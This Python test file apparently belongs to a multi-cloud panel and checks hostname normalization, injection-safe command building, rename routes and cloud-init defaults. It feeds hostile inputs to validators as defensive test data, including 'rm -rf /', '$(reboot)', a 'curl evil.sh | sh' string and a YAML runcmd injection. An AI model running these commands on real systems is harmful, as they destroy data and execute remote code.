"""自测：实例改名与系统主机名（hostname）。
覆盖：名称规范化、手动命令拼接防注入、改名接口（只改显示名 + 返回手动命令、绝不下发命令）、
新建实例默认主机名（cloud-init / OCI hostname_label）。
v1.6 关停自动同步（各云 Run Command / SSM）后，原三家 sync_hostname 分支与降级测试已随功能删除。
全部用 mock / moto，不连接任何真实云。"""
import asyncio
import base64
import os
import sys
import tempfile

D = tempfile.mkdtemp()
os.environ.update(TRICLOUD_DATA=D, PANEL_PASSWORD="devpassword123",
                  AWS_ACCESS_KEY_ID="testing", AWS_SECRET_ACCESS_KEY="testing", AWS_DEFAULT_REGION="us-east-1")
for k in ("HTTPS_PROXY", "HTTP_PROXY", "https_proxy", "http_proxy", "FERNET_KEY"):
    os.environ.pop(k, None)
ROOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..")
sys.path.insert(0, ROOT)
from unittest import mock

import oci
from fastapi.testclient import TestClient
from moto import mock_aws

from app import cloudinit, core, hostname, main, services, tasks, telegram
from app.routers import oci as oci_routes
from app.providers.aws_provider import AWSProvider
from app.providers.azure_provider import AzureProvider
from app.providers.oci_provider import OCIProvider

R = []


def ok(name, cond):
    R.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name)


async def noop():
    await asyncio.sleep(3600)


for f in ("task_loop", "monitor_loop", "schedule_loop"):
    setattr(tasks, f, noop)
telegram.poll_loop = noop


class Obj:
    def __init__(self, **kw):
        self.__dict__.update(kw)


# ================= 1. 规范化 =================
N = hostname.normalize
ok("normalize: lowercase + spaces -> -", N("Web Server 01") == "web-server-01")
ok("normalize: drops illegal chars", N("a;b$c`d|e&f") == "abcdef" and N("x/y\\z'\"") == "xyz")
ok("normalize: underscore / dot -> -, collapse --", N("my__box..prod") == "my-box-prod" and N("a - - b") == "a-b")
ok("normalize: strip leading / trailing -", N("--abc--") == "abc" and N("-_-x") == "x")
ok("normalize: max 63 and no trailing - after cut", len(N("a" * 100)) == 63 and N("a" * 62 + "-b") == "a" * 62
   and not N("a" * 62 + "-bcd").endswith("-"))
ok("normalize: only non-ASCII -> empty (skip)", N("东京主机") == "" and N("") == "" and N(None) == "" and N("---") == "")
ok("normalize: mixed CJK keeps ascii", N("东京-arm-1") == "arm-1")

# ================= 2. 命令拼接防注入 =================
bad = ["a;rm -rf /", "$(reboot)", "`id`", "A", "-a", "a-", "", "a b", "a.b", "a" * 64, "x'y", 'x"y', "a\nb", None, 5]
rej = 0
for b in bad:
    try:
        hostname.build_cmd(b)
    except ValueError:
        rej += 1
ok("inject: build_cmd rejects every non-normalized value", rej == len(bad))
cmd = hostname.build_cmd("web-1")
ok("inject: command uses fixed template", cmd.startswith("hostnamectl set-hostname web-1 2>/dev/null || echo web-1 > /etc/hostname && hostname web-1;")
   and 'sed -i "s/^127.0.1.1.*/127.0.1.1 web-1/" /etc/hosts || true;' in cmd
   and 'grep -q "127.0.1.1" /etc/hosts || echo "127.0.1.1 web-1" >> /etc/hosts' in cmd)
ok("inject: cloud-init preserve_hostname drop-in", 'echo "preserve_hostname: true" > /etc/cloud/cloud.cfg.d/99-tricloud-hostname.cfg' in cmd)
evil = "x; curl evil.sh | sh #`id` $(whoami)"
h_evil = N(evil)
c_evil = hostname.build_cmd(h_evil)
ok("inject: malicious display name becomes harmless token", h_evil == "x-curl-evil-sh-sh-id-whoami"
   and set(h_evil) <= set("abcdefghijklmnopqrstuvwxyz0123456789-") and c_evil == cmd.replace("web-1", h_evil))
ok("inject: no single quote in command (safe to wrap in sh -c '…')", "'" not in cmd
   and hostname.manual_cmd("web-1").count("'") == 2 and hostname.manual_cmd("web-1").startswith("sudo sh -c '"))
ok("inject: manual_cmd = sudo sh -c '<fixed cmd>'", hostname.manual_cmd("web-1") == f"sudo sh -c '{cmd}'")

r = hostname.manual_result("Web 1")
ok("manual_result: manual + cmd for normalized name", r["status"] == "manual" and r["hostname"] == "web-1"
   and r["manual_cmd"] == hostname.manual_cmd("web-1"))
r = hostname.manual_result("东京机")
ok("manual_result: empty normalized -> unsupported, no cmd", r["status"] == "unsupported" and "manual_cmd" not in r)


# ================= 3. Azure 分支 =================
class AzPoller:
    def __init__(self, done=True, err=None):
        self._done, self.err = done, err

    def wait(self, t=None):
        pass

    def done(self):
        return self._done

    def result(self):
        if self.err:
            raise self.err
        return Obj(value=[Obj(message="Enable succeeded")])


class AzVMs:
    def __init__(self, os_type="Linux", poller=None, raise_on_run=None):
        self.os_type, self.poller, self.raise_on_run = os_type, poller or AzPoller(), raise_on_run
        self.runs, self.updates, self.tags = [], [], {"env": "prod"}

    def get(self, rg, n):
        return Obj(tags=dict(self.tags), storage_profile=Obj(os_disk=Obj(os_type=self.os_type)),
                   os_profile=Obj(windows_configuration=None))

    def begin_run_command(self, rg, n, params):
        if self.raise_on_run:
            raise self.raise_on_run
        self.runs.append((rg, n, params))
        return self.poller

    def begin_update(self, rg, n, params):
        self.updates.append((rg, n, params))
        return AzPoller()


AZ_VM = "/subscriptions/s/resourceGroups/rg1/providers/Microsoft.Compute/virtualMachines/vm1"


def az(vms):
    p = AzureProvider.__new__(AzureProvider)
    p.compute = Obj(virtual_machines=vms)
    return p


vms = AzVMs()
az(vms).rename(AZ_VM, "Web 1")
ok("azure: rename writes tricloud-name tag, keeps other tags", vms.updates == [("rg1", "vm1", {"tags": {"env": "prod", "tricloud-name": "Web 1"}})])


# ================= 4. 改名接口 =================
class FakeProv:
    def __init__(self, result=None):
        self.renamed, self.synced, self.result = [], [], result or {"status": "ok", "message": "done"}

    def rename(self, iid, name):
        self.renamed.append((iid, name))
        return {"ok": True}

    def sync_hostname(self, iid, h, **kw):
        self.synced.append((iid, h))
        return dict(self.result)


mock.patch.object(OCIProvider, "__init__", lambda self, cred, region=None: setattr(self, "cred", cred)).start()
mock.patch.object(AzureProvider, "__init__", lambda self, cred, region=None: setattr(self, "cred", cred)).start()

with TestClient(main.app) as c:
    c.post("/api/login", json={"password": "devpassword123"})
    with mock.patch.object(OCIProvider, "test", return_value={"ok": True}):
        oid = c.post("/api/accounts", json={"provider": "oci", "name": "oci-1", "cred": {
            "user": "ocid1.user.oc1..fakeuser123456", "tenancy": "ocid1.tenancy.oc1..faketen654321", "fingerprint": "aa:bb",
            "key_content": "-----BEGIN PRIVATE KEY-----\nFAKE\n-----END PRIVATE KEY-----\n", "region": "ap-tokyo-1"}}).json()["id"]
    with mock.patch.object(AWSProvider, "test", return_value={"ok": True}):
        aid = c.post("/api/accounts", json={"provider": "aws", "name": "aws-1", "cred": {
            "access_key": "AKIAFAKEFAKE1234", "secret_key": "s3cr3t-fake", "region": "us-east-1"}}).json()["id"]
    with mock.patch.object(AzureProvider, "test", return_value={"ok": True}):
        zid = c.post("/api/accounts", json={"provider": "azure", "name": "az-1", "cred": {
            "tenant_id": "t", "client_id": "c", "client_secret": "s", "subscription_id": "00000000-0000-0000-0000-000000000000"}}).json()["id"]

    fp = FakeProv()
    with mock.patch.object(services, "provider", lambda acc_id, region=None: fp):
        r = c.post(f"/api/accounts/{zid}/instances/rename", json={"instance_id": AZ_VM, "new_name": "Web Prod 1"})
        j = r.json()
        ok("route: rename ok, NO command dispatched, manual block returned", r.status_code == 200 and j["ok"] and fp.renamed == [(AZ_VM, "Web Prod 1")]
           and not fp.synced and j["hostname"]["status"] == "manual" and j["hostname"]["hostname"] == "web-prod-1"
           and j["hostname"]["manual_cmd"] == hostname.manual_cmd("web-prod-1"))
        aud = core.q("SELECT * FROM audit WHERE actor='hostname-sync' ORDER BY id DESC LIMIT 1", one=True)
        ok("route: no hostname-sync audit (feature off)", aud is None)
        fp.renamed, fp.synced = [], []
        r = c.post(f"/api/accounts/{oid}/oci/rename", json={"instance_id": "ocid1.instance.x", "new_name": "arm 2", "sync_hostname": False})
        ok("route: legacy sync_hostname param ignored, still manual", r.status_code == 200 and fp.renamed and not fp.synced
           and r.json()["hostname"]["status"] == "manual")
        r = c.post(f"/api/accounts/{oid}/instances/rename", json={"instance_id": "ocid1.instance.x", "new_name": "arm 3", "sync_hostname": "false"})
        ok("route: sync_hostname='false' string likewise manual-only", r.status_code == 200 and not fp.synced)
        ok("route: empty name 400 / missing instance 400", c.post(f"/api/accounts/{oid}/instances/rename", json={"instance_id": "x", "new_name": " "}).status_code == 400
           and c.post(f"/api/accounts/{oid}/instances/rename", json={"new_name": "a"}).status_code == 400)
        ok("route: Lightsail rename refused", c.post(f"/api/accounts/{aid}/instances/rename",
                                                     json={"instance_id": "ls-1", "new_name": "a", "kind": "lightsail"}).status_code == 400)
        ok("route: /oci/rename refuses non-OCI account", c.post(f"/api/accounts/{aid}/oci/rename", json={"instance_id": "i", "new_name": "a"}).status_code == 400)
        r = c.post(f"/api/accounts/{oid}/instances/rename", json={"instance_id": "ocid1.instance.x", "new_name": "东京机"})
        ok("route: CJK-only name renames, hostname unsupported", r.status_code == 200 and r.json()["hostname"]["status"] == "unsupported" and not fp.synced)

    # AWS EC2 改名 = Name 标签（moto）
    with mock_aws():
        p = AWSProvider({"access_key": "testing", "secret_key": "testing", "region": "us-east-1"})
        ec2 = p.c("ec2")
        ami = ec2.describe_images()["Images"][0]["ImageId"]
        iid = ec2.run_instances(ImageId=ami, MinCount=1, MaxCount=1, InstanceType="t3.micro")["Instances"][0]["InstanceId"]
        p.rename(iid, "Renamed Box")
        ok("aws: rename sets Name tag (list shows it)", [i["name"] for i in p.list_instances() if i["id"] == iid] == ["Renamed Box"])
        # 新建 EC2：UserData 带 hostname
        with mock.patch.object(AWSProvider, "_ami", return_value=ami), mock.patch.object(AWSProvider, "_sg", return_value="sg-1"):
            cap = {}
            real = p.c

            class EC2Proxy:
                def __init__(self, cl):
                    self.cl = cl

                def __getattr__(self, n):
                    return getattr(self.cl, n)

                def run_instances(self, **kw):
                    cap.update(kw)
                    return {"Instances": [{"InstanceId": "i-new", "State": {"Name": "pending"}}]}
            p.c = lambda svc, region=None: EC2Proxy(real(svc, region)) if svc == "ec2" else real(svc, region)
            p.ec2_create({"name": "My EC2_Box", "script": "echo hi"})
        ok("create aws: user_data cloud-init hostname = normalized name, script kept",
           "hostname: my-ec2-box" in cap.get("UserData", "") and "tricloud-init.sh" in cap.get("UserData", ""))


# ================= 5. 新建实例默认主机名 =================
old = cloudinit.cloud_init("Pw#123abcXYZ", "root", "echo hi")
ok("cloud-init: no hostname -> output unchanged (back-compat)", "hostname" not in old and old.startswith("#cloud-config\nssh_pwauth"))
ud = cloudinit.cloud_init("Pw#123abcXYZ", "root", "echo hi", hostname="web-1")
ok("cloud-init: hostname / fqdn / preserve_hostname lines added, user script kept", "\nhostname: web-1\nfqdn: web-1\npreserve_hostname: false\n" in ud
   and "tricloud-init.sh" in ud and "chpasswd" in ud)
ok("cloud-init: invalid hostname ignored (no YAML injection)", "hostname" not in cloudinit.cloud_init(None, hostname="a\nruncmd: [x]"))


class LaunchCompute:
    def __init__(self, fail_first=False):
        self.dets, self.fail_first = [], fail_first

    def launch_instance(self, det):
        self.dets.append((det.create_vnic_details.hostname_label, det.metadata.get("user_data")))
        if self.fail_first and len(self.dets) == 1:
            raise oci.exceptions.ServiceError(400, "InvalidParameter", {}, "Hostname label web-1 is already in use")
        return Obj(data=Obj(id="ocid1.instance.new", display_name=det.display_name, lifecycle_state="PROVISIONING"))


def oci_create(dns="pub", fail_first=False):
    p = OCIProvider.__new__(OCIProvider)
    p.cred, p.compartment = {}, "c"
    p.compute = LaunchCompute(fail_first)
    p.vnet = Obj(get_subnet=lambda sid: Obj(data=Obj(dns_label=dns)))
    p._pick_subnet = lambda sid: "subnet-1"
    p._pick_image = lambda *a: "img-1"
    return p


p = oci_create()
p.create_instance({"name": "Web 1", "shape": "VM.Standard.E2.1.Micro", "ad": "AD-1", "script": "echo hi"})
lab, udb = p.compute.dets[0]
ok("create oci: hostname_label = normalized name", lab == "web-1")
ok("create oci: cloud-init hostname + user script preserved", "hostname: web-1" in base64.b64decode(udb).decode()
   and "tricloud-init.sh" in base64.b64decode(udb).decode())
p = oci_create(dns=None)
p.create_instance({"name": "Web 1", "shape": "VM.Standard.E2.1.Micro", "ad": "AD-1"})
ok("create oci: subnet without DNS -> no hostname_label", p.compute.dets[0][0] is None)
p = oci_create(fail_first=True)
r = p.create_instance({"name": "Web 1", "shape": "VM.Standard.E2.1.Micro", "ad": "AD-1"})
ok("create oci: label conflict -> retried once without label", [d[0] for d in p.compute.dets] == ["web-1", None] and r["id"] == "ocid1.instance.new")

# ================= 5b. OCI 系统版本下拉：/oci/os-versions =================
IMGS = [Obj(operating_system=o, operating_system_version=v) for o, v in [
    ("Canonical Ubuntu", "22.04"), ("Canonical Ubuntu", "24.04"), ("Canonical Ubuntu", "22.04"), ("Canonical Ubuntu", "20.04"),
    ("Canonical Ubuntu", "24.04 Minimal"), ("Oracle Linux", "8"), ("Oracle Linux", "9"), ("Oracle Linux", "7.9"), ("Oracle Linux", "8.10"),
    ("Oracle Linux", "9"), ("Windows", "Server 2022 Standard"), ("CentOS", "7"), ("Canonical Ubuntu", "")]]
seen_kw = {}


def fake_all(fn, **kw):
    seen_kw.update(kw)
    return Obj(data=list(IMGS))


p = OCIProvider.__new__(OCIProvider)
p.compartment, p.compute = "c", Obj(list_images=None)
with mock.patch("app.providers.oci_provider.oci.pagination.list_call_get_all_results", fake_all):
    ov = p.os_versions("VM.Standard.A1.Flex")
ok("os-versions: filtered by shape, platform images AVAILABLE", seen_kw.get("shape") == "VM.Standard.A1.Flex" and seen_kw.get("lifecycle_state") == "AVAILABLE")
ok("os-versions: dedup + descending (Ubuntu)", ov.get("Canonical Ubuntu") == ["24.04", "24.04 Minimal", "22.04", "20.04"], )
ok("os-versions: dedup + numeric descending (Oracle Linux 9 > 8.10 > 8 > 7.9)", ov.get("Oracle Linux") == ["9", "8.10", "8", "7.9"])
ok("os-versions: only Ubuntu / Oracle Linux (no CentOS / Windows / empty)", set(ov) == {"Canonical Ubuntu", "Oracle Linux"})


class OsvProv:
    def __init__(self):
        self.calls = []

    def os_versions(self, shape=None):
        self.calls.append(shape)
        return {"Canonical Ubuntu": ["24.04", "22.04"], "Oracle Linux": ["9"]}


ovp = OsvProv()
with TestClient(main.app) as c:
    c.post("/api/login", json={"password": "devpassword123"})
    with mock.patch.object(services, "provider", lambda acc_id, region=None: ovp):
        r1 = c.get(f"/api/accounts/{oid}/oci/os-versions?shape=VM.Standard.A1.Flex")
        r2 = c.get(f"/api/accounts/{oid}/oci/os-versions?shape=VM.Standard.A1.Flex")
        r3 = c.get(f"/api/accounts/{oid}/oci/os-versions?shape=VM.Standard.E2.1.Micro")
        ok("os-versions route: returns {os: [versions]}", r1.status_code == 200 and r1.json() == {"Canonical Ubuntu": ["24.04", "22.04"], "Oracle Linux": ["9"]})
        ok("os-versions route: cached per shape (6h), new shape refetched", ovp.calls == ["VM.Standard.A1.Flex", "VM.Standard.E2.1.Micro"]
           and r2.json() == r1.json() and r3.status_code == 200)
        oci_routes._OSV_CACHE[(oid, "ap-tokyo-1", "VM.Standard.A1.Flex")] = (0, {"old": []})
        c.get(f"/api/accounts/{oid}/oci/os-versions?shape=VM.Standard.A1.Flex")
        ok("os-versions route: expired cache refetched", ovp.calls[-1] == "VM.Standard.A1.Flex" and len(ovp.calls) == 3)
        ok("os-versions route: OCI only", c.get(f"/api/accounts/{aid}/oci/os-versions").status_code == 400)
web_ = "".join(open(os.path.join(ROOT, "web", "js", f), encoding="utf-8").read() for f in sorted(os.listdir(os.path.join(ROOT, "web", "js"))) if f.endswith(".js"))
ok("web: os_version is a select, CentOS removed", '<select name="os_version">' in web_ and 'name="os_version" value=' not in web_ and "CentOS" not in web_)

# ================= 6. 约束：不引入 SSH / 远程控制台 =================
src = open(os.path.join(ROOT, "app", "hostname.py"), encoding="utf-8").read().lower()
req = open(os.path.join(ROOT, "requirements.txt"), encoding="utf-8").read().lower()
ok("no ssh: no paramiko / asyncssh / ssh client", "import paramiko" not in src and "paramiko" not in req and "asyncssh" not in req)
web = "".join(open(os.path.join(ROOT, "web", "js", f), encoding="utf-8").read() for f in sorted(os.listdir(os.path.join(ROOT, "web", "js"))) if f.endswith(".js"))
ok("web: rename dialog has NO sync checkbox (feature off)", 'name="sync_hostname"' not in web and "面板只修改云端显示名" in web)
andr = open(os.path.join(ROOT, "android", "app", "src", "main", "java", "com", "tricloud", "app", "AccountActivity.java"), encoding="utf-8").read()
ok("android: rename dialog has sync_hostname checkbox + manual_cmd", 'Field.check("sync_hostname"' in andr and "manual_cmd" in andr)
mockjs = open(os.path.join(ROOT, "demo", "mock.js"), encoding="utf-8").read()
ok("demo: mock rename returns hostname status manual", 'hostname: { status: "manual"' in mockjs)

print(f"\n{sum(x[1] for x in R)}/{len(R)} passed")
sys.exit(0 if all(x[1] for x in R) else 1)
